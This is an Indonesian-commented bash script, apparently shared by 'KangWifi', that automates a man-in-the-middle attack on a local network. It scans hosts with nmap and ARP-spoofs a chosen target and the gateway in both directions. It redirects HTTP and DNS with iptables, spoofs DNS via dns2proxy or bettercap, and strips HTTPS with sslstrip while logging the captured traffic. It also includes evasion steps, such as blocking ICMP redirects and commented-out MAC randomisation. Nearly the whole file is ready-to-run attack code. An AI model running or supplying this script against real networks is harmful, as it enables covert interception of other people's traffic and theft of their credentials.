#!/bin/bash

# Pastikan script dijalankan sebagai root
if [[ $EUID -ne 0 ]]; then
    echo "Script ini harus dijalankan sebagai root!"
    exit 1
fi

# Warna untuk output
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
cyan="\033[1;36m"
transparent="\e[0m"

# Variabel jaringan
lanip=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/')
gateway=$(ip route | grep default | awk '{print $3}')
interface=$(ip route | grep default | awk '{print $5}')

clear
echo -e "$yellow[!] Masih menunggu instalasi...$transparent"

# Blokir ICMP Redirect untuk menghindari deteksi MITM
echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
echo -e "$green[✔] ICMP Redirect Blocking diaktifkan"

# Cek & install dependensi
function install_pkg() {
    if ! command -v $1 &>/dev/null; then
        echo -e "$red[!] $1 tidak ditemukan, menginstall..."
        apt-get install -y $1 || {
            echo -e "$yellow[!] Instalasi gagal dari APT, mencoba dari GitHub..."
            if [ "$1" == "sslstrip" ]; then
                git clone https://github.com/moxie0/sslstrip.git /usr/share/sslstrip
                ln -s /usr/share/sslstrip/sslstrip.py /usr/bin/sslstrip
                chmod +x /usr/bin/sslstrip
            elif [ "$1" == "dns2proxy" ]; then
                git clone https://github.com/LeonardoNve/dns2proxy.git /usr/share/dns2proxy
            elif [ "$1" == "bettercap" ]; then
                curl -L https://github.com/bettercap/bettercap/releases/latest/download/bettercap_linux_amd64 -o /usr/bin/bettercap
                chmod +x /usr/bin/bettercap
            fi
        }
    else
        echo -e "$green[✔] $1 sudah terinstall"
    fi
}

# Daftar paket yang akan diinstal
deps=(tmux dsniff sslstrip dns2proxy bettercap nmap net-tools figlet)

# Install semua paket yang dibutuhkan
for pkg in "${deps[@]}"; do
    install_pkg $pkg
    sleep 1
done

clear

# Banner MITM ATTACK SCRIPT setelah instalasi selesai
echo -e "$cyan"
figlet "MITM ATTACK SCRIPT"
echo -e "$yellow By KangWifi$transparent"

# Aktifkan IP Forwarding
echo "1" > /proc/sys/net/ipv4/ip_forward
echo -e "$green[✔] IP Forwarding diaktifkan"

# Scan perangkat dalam jaringan
echo -e "$yellow[+] Memindai perangkat dalam jaringan...$transparent"
nmap -sn $lanip/24 | grep -E "Nmap scan report|MAC Address" > devices.txt
echo -e "$green[✔] Perangkat yang terdeteksi:"
cat devices.txt

# Konfigurasi target
echo -ne "$yellow[?] Masukkan IP target: $transparent"
read ipt
echo -ne "$yellow[?] Masukkan IP gateway: $transparent"
read ipg

echo -e "$yellow[+] Menjalankan serangan MITM...$transparent"

# Konfigurasi iptables untuk redirect HTTP dan DNS
iptables -t nat -F
iptables -F
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 5353

# Menyamarkan MAC Address agar sulit dideteksi
// ifconfig $interface down
// macchanger -r $interface
// ifconfig $interface up
// echo -e "$green[✔] MAC Address diacak untuk menghindari deteksi"

# Pastikan sslstrip log ada sebelum tailing
touch sslstrip.log

# Menjalankan arpspoof dengan `tmux` (lebih stabil di headless server)
tmux new-session -d -s arpspoof1 "arpspoof -i $interface -t $ipt $ipg > /dev/null 2>&1"
tmux new-session -d -s arpspoof2 "arpspoof -i $interface -t $ipg $ipt > /dev/null 2>&1"

# Menjalankan dns2proxy atau bettercap jika dns2proxy gagal
tmux new-session -d -s dns2proxy "cd /usr/share/dns2proxy && python3 dns2proxy.py > /dev/null 2>&1"
sleep 5
if ! pgrep -f dns2proxy.py > /dev/null; then
    echo -e "$red[!] dns2proxy gagal, menggunakan bettercap sebagai alternatif"
    tmux new-session -d -s bettercap "bettercap -iface $interface -caplet dns-spoof > /dev/null 2>&1"
fi

# Menjalankan sslstrip2 dan memantau log
tmux new-session -d -s sslstrip "sslstrip -l 8080 -w sslstrip.log > /dev/null 2>&1"

echo -e "$green[✔] MITM Attack sedang berjalan. Tekan CTRL+C untuk berhenti.$transparent"

# Menampilkan log sslstrip secara real-time
tail -f sslstrip.log

